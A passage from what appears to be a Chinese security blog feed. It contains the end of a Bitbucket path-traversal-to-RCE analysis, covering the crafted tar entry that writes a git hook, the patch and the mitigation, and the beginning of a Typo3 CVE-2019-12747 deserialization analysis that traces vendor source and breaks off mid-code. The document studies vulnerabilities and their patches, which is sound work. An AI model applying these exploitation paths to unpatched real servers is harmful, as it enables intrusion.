class="hljs-regexp">/data/</span><span class="hljs-keyword">repositories</span><span class="hljs-regexp">/153/im</span>ported-hooks<span class="hljs-regexp">/../</span>hooks<span class="hljs-regexp">/pre-receive.d/</span><span class="hljs-number">233</span>_bitbucket_callback<br></code></pre></td></tr></table></figure><p>等价于</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-regexp">/home/m</span>engchen<span class="hljs-regexp">/atlassian/</span>application-data<span class="hljs-regexp">/bitbucket/</span>shared<span class="hljs-regexp">/data/</span><span class="hljs-keyword">repositories</span><span class="hljs-regexp">/153/</span>hooks<span class="hljs-regexp">/pre-receive.d/</span><span class="hljs-number">233</span>_bitbucket_callback<br></code></pre></td></tr></table></figure><p>然后进入父类<code>DefaultEntrySource</code>的<code>extractToDisk</code>方法，直接进行了写文件操作。</p><p>路径：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-regexp">/Users/m</span>engchen<span class="hljs-regexp">/IdeaProjects/</span>BitBucket<span class="hljs-regexp">/WEB-INF/</span>lib<span class="hljs-regexp">/bitbucket-service-impl-6.1.1.jar!/</span>com<span class="hljs-regexp">/atlassian/</span>stash<span class="hljs-regexp">/internal/mig</span>ration/DefaultEntrySource.<span class="hljs-keyword">class</span><br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/bitbucket/20190929004051.png"></p><p>在这个过程中，没有对获得的路径进行任何的过滤，这就导致了一个目录穿越漏洞。目录穿越本身危害并不是太大，那么是如何造成RCE的呢？<br>其实此处的RCE是结合了Git仓库的本身功能，从某种意义上来说，算是打了一个combo吧。</p><p>在Git仓库中，有一个特殊的功能，当客户端或者服务端发生某种操作时，会调用特定的脚本来执行，一般分为两大类，客户端钩子和服务端钩子。在这里我们利用到的就是服务端钩子。在默认情况下，导入的仓库的钩子脚本会导入到<code>imported-hooks</code>目录下，而生效的脚本是在同级目录的<code>hooks</code>下。我们构造了一个恶意的Tar包，在其中存储的<code>hooks</code>脚本的路径为<code>../hooks/pre-receive.d/233_bitbucket_callback</code>，<code>Bitbucket</code>在导入过程中，没有对获得的路径进行一个验证，使得我们可以将导入的脚本写入到<code>hooks</code>文件夹下，在该仓库发生<code>git push</code>或者<code>git pull</code>操作时，我们写入的恶意脚本就会执行了。</p><h3 id="4-2-漏洞补丁分析"><a href="#4-2-漏洞补丁分析" class="headerlink" title="4.2 漏洞补丁分析"></a>4.2 漏洞补丁分析</h3><p>我们来看一下6.1.2版本的<code>TarArchiveSource</code>类</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">路径: atlassian-bitbucket-<span class="hljs-number">6.1</span>.<span class="hljs-number">2</span><span class="hljs-regexp">/app/</span>WEB-INF<span class="hljs-regexp">/lib/</span>bitbucket-service-impl-<span class="hljs-number">6.1</span>.<span class="hljs-number">2</span>.jar!<span class="hljs-regexp">/com/</span>atlassian<span class="hljs-regexp">/stash/i</span>nternal<span class="hljs-regexp">/migration/</span>TarArchiveSource.<span class="hljs-keyword">class</span><br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/bitbucket/image-20190929002827136.png"></p><p>可以看到，在源码中添加了一个方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">isRelative</span><span class="hljs-params">(<span class="hljs-meta">@Nonnull</span> Path entryPath)</span> </span>&#123;<br>        IntStream var10000 = IntStream.range(<span class="hljs-number">0</span>, entryPath.getNameCount());<br>        entryPath.getClass();<br>        <span class="hljs-keyword">return</span> var10000.mapToObj(entryPath::getName).map(Path::toString).anyMatch(<span class="hljs-string">&quot;..&quot;</span>::equals);<br>    &#125;<br></code></pre></td></tr></table></figure><p>当获得的路径中存在<code>..</code>时，抛出异常，不进行导入操作，这样就修复了目录穿越的漏洞。</p><h2 id="5-修复方式"><a href="#5-修复方式" class="headerlink" title="5. 修复方式"></a>5. 修复方式</h2><ul><li>升级Bitbucket 服务器到最新版本</li><li>缓解措施：禁用Bitbucket的导入功能，将<code>bitbucket.properties</code>文件中<code>feature.data.center.migration.import</code>的值设置为<code>false</code>，然后重启服务器使配置生效。如果还需运行导入任务，请在隔离的集群节点中运行。</li></ul><h2 id="6-参考链接"><a href="#6-参考链接" class="headerlink" title="6. 参考链接"></a>6. 参考链接</h2><ul><li><a href="https://git-scm.com/book/zh/v2/%E8%87%AA%E5%AE%9A%E4%B9%89-Git-Git-%E9%92%A9%E5%AD%90">https://git-scm.com/book/zh/v2/%E8%87%AA%E5%AE%9A%E4%B9%89-Git-Git-%E9%92%A9%E5%AD%90</a></li><li><a href="https://blog.ripstech.com/2019/bitbucket-path-traversal-to-rce/">https://blog.ripstech.com/2019/bitbucket-path-traversal-to-rce/</a></li><li><a href="https://confluence.atlassian.com/bitbucketserver/bitbucket-server-security-advisory-2019-05-22-969526871.html">https://confluence.atlassian.com/bitbucketserver/bitbucket-server-security-advisory-2019-05-22-969526871.html</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>代码审计</tag>
      
      <tag>漏洞分析</tag>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Typo3-CVE-2019-12747-反序列化漏洞分析</title>
    <link href="/2019/08/09/typo3-CVE-2019-12747/"/>
    <url>/2019/08/09/typo3-CVE-2019-12747/</url>
    
    <content type="html"><![CDATA[<p>Typo3 CVE-2019-12747 漏洞分析，本文首发<a href="https://paper.seebug.org/996/">paper.seebug.org</a></p><a id="more"></a><h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h2><p><code>TYPO3</code>是一个以<code>PHP</code>编写、采用<code>GNU</code>通用公共许可证的自由、开源的内容管理系统。</p><p>2019年7月16日，<code>RIPS</code>的研究团队公开了<code>Typo3 CMS</code>的一个关键漏洞<a href="https://blog.ripstech.com/2019/typo3-overriding-the-database/">详情</a>，<code>CVE</code>编号为<code>CVE-2019-12747</code>，它允许后台用户执行任意<code>PHP</code>代码。</p><p>漏洞影响范围：<code>Typo3 8.x-8.7.26 9.x-9.5.7</code>。</p><h2 id="2-测试环境简述"><a href="#2-测试环境简述" class="headerlink" title="2. 测试环境简述"></a>2. 测试环境简述</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Nginx</span>/<span class="hljs-number">1</span>.<span class="hljs-number">15</span>.<span class="hljs-number">8</span><br><span class="hljs-attribute">PHP</span> <span class="hljs-number">7</span>.<span class="hljs-number">3</span>.<span class="hljs-number">1</span> + xdebug <span class="hljs-number">2</span>.<span class="hljs-number">7</span>.<span class="hljs-number">2</span><br><span class="hljs-attribute">MySQL</span> <span class="hljs-number">5</span>.<span class="hljs-number">7</span>.<span class="hljs-number">27</span><br><span class="hljs-attribute">Typo3</span> <span class="hljs-number">9</span>.<span class="hljs-number">5</span>.<span class="hljs-number">7</span><br></code></pre></td></tr></table></figure><h2 id="3-TCA"><a href="#3-TCA" class="headerlink" title="3. TCA"></a>3. TCA</h2><p>在进行分析之前，我们需要了解下<code>Typo3</code>的<code>TCA（Table Configuration Array）</code>，在<code>Typo3</code>的代码中，它表示为<code>$GLOBALS[&#39;TCA&#39;]</code>。</p><p>在<code>Typo3</code>中，<code>TCA</code>算是对于数据库表的定义的扩展，定义了哪些表可以在<code>Typo3</code>的后端可以被编辑，主要的功能有</p><ul><li>表示表与表之间的关系</li><li>定义后端显示的字段和布局</li><li>验证字段的方式</li></ul><p>这次漏洞的两个利用点分别出在了<code>CoreEngine</code>和<code>FormEngine</code>这两大结构中，而<code>TCA</code>就是这两者之间的桥梁，告诉两个核心结构该如何表现表、字段和关系。</p><p><code>TCA</code>的第一层是表名：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;TCA&#x27;</span>][<span class="hljs-string">&#x27;pages&#x27;</span>] = [<br>    ...<br>];<br><span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;TCA&#x27;</span>][<span class="hljs-string">&#x27;tt_content&#x27;</span>] = [<br>    ...<br>];<br></code></pre></td></tr></table></figure><p>其中<code>pages</code>和<code>tt_content</code>就是数据库中的表。</p><p>接下来一层就是一个数组，它定义了如何处理表，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;TCA&#x27;</span>][<span class="hljs-string">&#x27;pages&#x27;</span>] = [<br>    <span class="hljs-string">&#x27;ctrl&#x27;</span> =&gt; [ <span class="hljs-comment">// 通常包含表的属性</span><br>        ....<br>    ],<br>    <span class="hljs-string">&#x27;interface&#x27;</span> =&gt; [ <span class="hljs-comment">// 后端接口属性等</span><br>        ....<br>    ],<br>    <span class="hljs-string">&#x27;columns&#x27;</span> =&gt; [<br>        ....<br>    ],<br>    <span class="hljs-string">&#x27;types&#x27;</span> =&gt; [<br>        ....<br>    ],<br>    <span class="hljs-string">&#x27;palettes&#x27;</span> =&gt; [<br>        ....<br>    ],<br>];<br></code></pre></td></tr></table></figure><p>在这次分析过程中，只需要了解这么多，更多详细的资料可以查询<a href="https://docs.typo3.org/m/typo3/reference-tca/master/en-us/Introduction/Index.html">官方手册</a>。</p><h2 id="4-漏洞分析"><a href="#4-漏洞分析" class="headerlink" title="4. 漏洞分析"></a>4. 漏洞分析</h2><p>整个漏洞的利用流程并不是特别复杂，主要需要两个步骤，第一步变量覆盖后导致反序列化的输入可控，第二步构造特殊的反序列化字符串来写<code>shell</code>。第二步这个就是老套路了，找个在魔术方法中能写文件的类就行。这个漏洞好玩的地方在于变量覆盖这一步，而且进入两个组件漏洞点的传入方式也有着些许不同，接下来让我们看一看这个漏洞吧。</p><h3 id="4-1-补丁分析"><a href="#4-1-补丁分析" class="headerlink" title="4.1 补丁分析"></a>4.1 补丁分析</h3><p>从Typo3官方的<a href="https://typo3.org/security/advisory/typo3-core-sa-2019-020/">通告</a>中我们可以知道漏洞影响了两个组件——<code>Backend &amp; Core API (ext:backend, ext:core)</code>，在GitHub上我们可以找到<a href="https://github.com/TYPO3/TYPO3.CMS/commit/555e0dd2b28f01a2f242dfefc0f344d10de50b2a?diff=unified">修复记录</a>：</p><p><img src="https://image.mengsec.com/typo3/1.png" alt="image-20190730105218225"></p><p>很明显，补丁分别禁用了<code>backend</code>的<code>DatabaseLanguageRows.php</code>和<code>core</code>中的<code>DataHandler.php</code>中的的反序列化操作。</p><h3 id="4-2-Backend-ext-漏洞点利用过程分析"><a href="#4-2-Backend-ext-漏洞点利用过程分析" class="headerlink" title="4.2 Backend ext 漏洞点利用过程分析"></a>4.2 Backend ext 漏洞点利用过程分析</h3><p>根据补丁的位置，看下<code>Backend</code>组件中的漏洞点。</p><p>路径：<code>typo3/sysext/backend/Classes/Form/FormDataProvider/DatabaseLanguageRows.php:37</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">addData</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> <span class="hljs-variable">$result</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$result</span>[<span class="hljs-string">&#x27;processedTca&#x27;</span>][<span class="hljs-string">&#x27;ctrl&#x27;</span>][<span class="hljs-string">&#x27;languageField&#x27;</span>])<br>        &amp;&amp; !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$result</span>[<span class="hljs-string">&#x27;processedTca&#x27;</span>][<span class="hljs-string">&#x27;ctrl&#x27;</span>][<span class="hljs-string">&#x27;transOrigPointerField&#x27;</span>])<br>    ) &#123;<br>        <span class="hljs-variable">$languageField</span> = <span class="hljs-variable">$result</span>[<span class="hljs-string">&#x27;processedTca&#x27;</span>][<span class="hljs-string">&#x27;ctrl&#x27;</span>][<span class="hljs-string">&#x27;languageField&#x27;</span>];<br>        <span class="hljs-variable">$fieldWithUidOfDefaultRecord</span> = <span class="hljs-variable">$result</span>[<span class="hljs-string">&#x27;processedTca&#x27;</span>][<span class="hljs-string">&#x27;ctrl&#x27;</span>][<span class="hljs-string">&#x27;transOrigPointerField&#x27;</span>];<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$result</span>[<span class="hljs-string">&#x27;databaseRow&#x27;</span>][<span class="hljs-variable">$languageField</span>]) &amp;&amp; <span class="hljs-variable">$result</span>[<span class="hljs-string">&#x27;databaseRow&#x27;</span>][<span class="hljs-variable">$languageField</span>] &gt; <span class="hljs-number">0</span><br>            &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$result</span>[<span class="hljs-string">&#x27;databaseRow&#x27;</span>][<span class="hljs-variable">$fieldWithUidOfDefaultRecord</span>]) &amp;&amp; <span class="hljs-variable">$result</span>[<span class="hljs-string">&#x27;databaseRow&#x27;</span>][<span class="hljs-variable">$fieldWithUidOfDefaultRecord</span>] &gt; <span class="hljs-number">0</span><br>        ) &#123;<br>            <span class="hljs-comment">// Default language record of localized record</span><br>            <span class="hljs-variable">$defaultLanguageRow</span> = <span class="hljs-keyword">$this</span>-&gt;getRecordWorkspaceOverlay(<br>                <span class="hljs-variable">$result</span>[<span class="hljs-string">&#x27;tableName&#x27;</span>],<br>                (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$result</span>[<span class="hljs-string">&#x27;databaseRow&#x27;</span>][<span class="hljs-variable">$fieldWithUidOfDefaultRecord</span>]<br>            );<br>            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$defaultLanguageRow</span>)) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> DatabaseDefaultLanguageException(<br>                    <span class="hljs-string">&#x27;Default language record with id &#x27;</span> . (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$result</span>[<span class="hljs-string">&#x27;databaseRow&#x27;</span>][<span class="hljs-variable">$fieldWithUidOfDefaultRecord</span>]<br>                    . <span class="hljs-string">&#x27; not found in table &#x27;</span> . <span class="hljs-variable">$result</span>[<span class="hljs-string">&#x27;tableName&#x27;</span>] . <span class="hljs-string">&#x27; while editing record &#x27;</span> . <span class="hljs-variable">$result</span>[<span class="hljs-string">&#x27;databaseRow&#x27;</span>][<span class="hljs-string">&#x27;uid&#x27;</span>],<br>                    <span class="hljs-number">1438249426</span><br>                );<br>            &#125;<br>            <span class="hljs-variable">$result</span>[<span class="hljs-string">&#x27;defaultLanguageRow&#x27;</span>] = <span class="hljs-variable">$defaultLanguageRow</span>;<br><br>            <span class="hljs-comment">// Unserialize the &quot;original diff source&quot; if given</span><br>            <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$result</span>[<span class="hljs-string">&#x27;processedTca&#x27;</span>][<span class="hljs-string">&#x27;ctrl&#x27;</span>][<span class="hljs-string">&#x27;transOrigDiffSourceField&#x27;</span>])<br>                &amp;&amp; !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$result</span>[<span class="hljs-string">&#x27;databaseRow&#x27;</span>][<span class="hljs-variable">$result</span>[<span class="hljs-string">&#x27;processedTca&#x27;</span>][<span class="hljs-string">&#x27;ctrl&#x27;</span>][<span class="hljs-string">&#x27;transOrigDiffSourceField&#x27;</span>]])<br>            ) &#123;<br>                <span class="hljs-variable">$defaultLanguageKey</span> = <span class="hljs-variable">$result</span>[<span class="hljs-string">&#x27;tableName&#x27;</span>] . <span class="hljs-string">&#x27;:&#x27;</span> . (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$result</span>[<span class="hljs-string">&#x27;databaseRow&#x27;</span>][<span class="hljs-string">&#x27;uid&#x27;</span>];<br>                <span class="hljs-variable">$result</span>[<span class="hljs-string">&#x27;defaultLanguageDiffRow&#x27;</span>][<span class="hljs-variable">$defaultLanguageKey</span>] = unserialize(<span class="hljs-variable">$result</span>[<span class="hljs-string">&#x27;databaseRow&#x27;</span>][<span class="hljs-variable">$result</span>[<span class="hljs-string">&#x27;processedTca&#x27;</span>][<span class="hljs-string">&#x27;ctrl&#x27;</span>][<span class="hljs-string">&#x27;transOrigDiffSourceField&#x27;</span>]]);<br>            &#125;<br>                <span class="hljs-comment">//省略代码</span><br>        &#125;<br>        <span class="hljs-comment">//省略代码</span><br>    &#125;<br>    <span class="hljs-comment">//省略代码</span><br>&#125;<br></code></pre></td></tr></table></figure><p>很多类都继承了<code>FormDataProviderInterface</code>接口，因此静态分析寻找谁调用的<code>DatabaseLanguageRows</code>的<code>addData</code>方法根本不现实，但是根据文章中的演示视频，我们可以知道网站中修改<code>page</code>这个功能中进入了漏洞点。在<code>addData</code>方法加上断点，然后发出一个正常的修改<code>page</code>的请求。</p><p>当程序断在<code>DatabaseLanguageRows</code>的<code>addData</code>方法后，我们就可以得到调用链。</p><p><img src="https://image.mengsec.com/typo3/2.png" alt="image-20190730173532736"></p><p>在<code>DatabaseLanguageRows</code>这个<code>addData</code>中，只传入了一个<code>$result</code>数组，而且进行反序列化操作的目标是<code>$result[&#39;databaseRow&#39;]</code>中的某个值。看命名有可能是从数据库中获得的值，往前分析一下。</p><p>进入<code>OrderedProviderList</code>的<code>compile</code>方法。</p><p>路径：<code>typo3/sysext/backend/Classes/Form/FormDataGroup/OrderedProviderList.php:43</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">compile</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> <span class="hljs-variable">$result</span></span>): <span class="hljs-title">array</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$orderingService</span> = GeneralUtility::makeInstance(DependencyOrderingService::class);<br>    <span class="hljs-variable">$orderedDataProvider</span> = <span class="hljs-variable">$orderingService</span>-&gt;orderByDependencies(<span class="hljs-keyword">$this</span>-&gt;providerList, <span class="hljs-string">&#x27;before&#x27;</span>, <span class="hljs-string">&#x27;depends&#x27;</span>);<br><br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$orderedDataProvider</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$providerClassName</span> =&gt; <span class="hljs-variable">$providerConfig</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$providerConfig</span>[<span class="hljs-string">&#x27;disabled&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$providerConfig</span>[<span class="hljs-string">&#x27;disabled&#x27;</span>] === <span class="hljs-literal">true</span>) &#123;<br>            <span class="hljs-comment">// Skip this data provider if disabled by configuration</span><br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-comment">/** <span class="hljs-doctag">@var</span> FormDataProviderInterface $provider */</span><br>        <span class="hljs-variable">$provider</span> = GeneralUtility::makeInstance(<span class="hljs-variable">$providerClassName</span>);<br><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$provider</span> <span class="hljs-keyword">instanceof</span> FormDataProviderInterface) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> \<span class="hljs-built_in">UnexpectedValueException</span>(<br>                <span class="hljs-string">&#x27;Data provider &#x27;</span> . <span class="hljs-variable">$providerClassName</span> . <span class="hljs-string">&#x27; must implement FormDataProviderInterface&#x27;</span>,<br>                <span class="hljs-number">1485299408</span><br>            );<br>        &#125;<br><br>        <span class="hljs-variable">$result</span> = <span class="hljs-variable">$provider</span>-&gt;addData(<span class="hljs-variable">$result</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们可以看到，在<code>foreach</code>这个循环中，动态实例化<code>$this-&gt;providerList</code>中的类，然后调用它的<code>addData</code>方法，并将<code>$result</code>作为方法的参数。</p><p>在调用<code>DatabaseLanguageRows</code>之前，调用了如图所示的类的<code>addData</code>方法。</p><p><img src="https://image.mengsec.com/typo3/3.png" alt="image-20190730181026707"></p><p>经过查询手册以及分析代码，可以知道在<code>DatabaseEditRow</code>类中，通过调用<code>addData</code>方法，将数据库表中数据读取出来，存储到了<code>$result[&#39;databaseRow&#39;]</code>中。</p><p><img src="https://image.mengsec.com/typo3/4.png" alt="image-20190730181458072"></p><p>路径：<code>typo3/sysext/backend/Classes/Form/FormDataProvider/DatabaseEditRow.php:32</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">addData</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> <span class="hljs-variable">$result</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$result</span>[<span class="hljs-string">&#x27;command&#x27;</span>] !== <span class="hljs-string">&#x27;edit&#x27;</span> || !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$result</span>[<span class="hljs-string">&#x27;databaseRow&#x27;</span>])) &#123;<span class="hljs-comment">// 限制功能为`edit`</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;<br>    &#125;<br><br>    <span class="hljs-variable">$databaseRow</span> = <span class="hljs-keyword">$this</span>-&gt;getRecordFromDatabase(<span class="hljs-variable">$result</span>[<span class="hljs-string">&#x27;tableName&#x27;</span>], <span class="hljs-variable">$result</span>[<span class="hljs-string">&#x27;vanillaUid&#x27;</span>]); <span class="hljs-comment">// 获取数据库中的记录</span><br>    <span class="hljs-keyword">if</span> (!array_key_exists(<span class="hljs-string">&#x27;pid&#x27;</span>, <span class="hljs-variable">$databaseRow</span>)) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> \<span class="hljs-built_in">UnexpectedValueException</span>(<br>            <span class="hljs-string">&#x27;Parent record does not have a pid field&#x27;</span>,<br>            <span class="hljs-number">1437663061</span><br>        );<br>    &#125;<br>    BackendUtility::fixVersioningPid(<span class="hljs-variable">$result</span>[<span class="hljs-string">&#x27;tableName&#x27;</span>], <span class="hljs-variable">$databaseRow</span>);<br>    <span class="hljs-variable">$result</span>[<span class="hljs-string">&#x27;databaseRow&#x27;</span>] = <span class="hljs-variable">$databaseRow</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>再后面又调用了<code>DatabaseRecordOverrideValues</code>类的<code>addData</code>方法。</p><p><img src="https://image.mengsec.com/typo3/5.png" alt="image-20190730182827872"></p><p>路径：<code>typo3/sysext/backend/Classes/Form/FormDataProvider/DatabaseRecordOverrideValues.php:31</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">addData</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> <span class="hljs-variable">$result</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$result</span>[<span class="hljs-string">&#x27;overrideValues&#x27;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$fieldName</span> =&gt; <span class="hljs-variable">$fieldValue</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$result</span>[<span class="hljs-string">&#x27;processedTca&#x27;</span>][<span class="hljs-string">&#x27;columns&#x27;</span>][<span class="hljs-variable">$fieldName</span>])) &#123;<br>            <span class="hljs-variable">$result</span>[<span class="hljs-string">&#x27;databaseRow&#x27;</span>][<span class="hljs-variable">$fieldName</span>] = <span class="hljs-variable">$fieldValue</span>;<br>            <span class="hljs-variable">$result</span>[<span class="hljs-string">&#x27;processedTca&#x27;</span>][<span class="hljs-string">&#x27;columns&#x27;</span>][<span class="hljs-variable">$fieldName</span>][<span class="hljs-string">&#x27;config&#x27;</span>] = [<br>                <span class="hljs-string">&#x27;type&#x27;</span> =&gt; <span class="hljs-string">&#x27;hidden&#x27;</span>,<br>                <span class="hljs-string">&#x27;renderType&#x27;</span> =&gt; <span class="hljs-string">&#x27;hidden&#x27;</span>,<br>            ];<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>在这里，将<code>$result[&#39;overrideValues&#39;]</code>中的键值对存储到了<code>$result[&#39;databaseRow&#39;]</code>中，如果<code>$result[&#39;overrideValues&#39;]</code>可控，那么通过这个类，我们就能控制<code>$result[&#39;databaseRow&#39;]</code>的值了。</p><p>再往前，看看<code>$result</code>的值是怎么来的。</p><p>路径：<code>typo3/sysext/backend/Classes/Form/FormDataCompiler.php:58</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">compile</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> <span class="hljs-variable">$initialData</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-keyword">$this</span>-&gt;initializeResultArray();<br>    <span class="hljs-comment">//省略代码</span><br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$initialData</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$dataKey</span> =&gt; <span class="hljs-variable">$dataValue</span>) &#123;<br>        <span class="hljs-comment">// 省略代码...</span><br>        <span class="hljs-variable">$result</span>[<span class="hljs-variable">$dataKey</span>] = <span class="hljs-variable">$dataValue</span>;<br>    &#125;<br>    <span class="hljs-variable">$resultKeysBeforeFormDataGroup</span> = array_keys(<span class="hljs-variable">$result</span>);<br><br>    <span class="hljs-variable">$result</span> = <span class="hljs-keyword">$this</span>-&gt;formDataGroup-&gt;compile(<span class="hljs-variable">$result</span>);<br><br>    <span class="hljs-comment">// 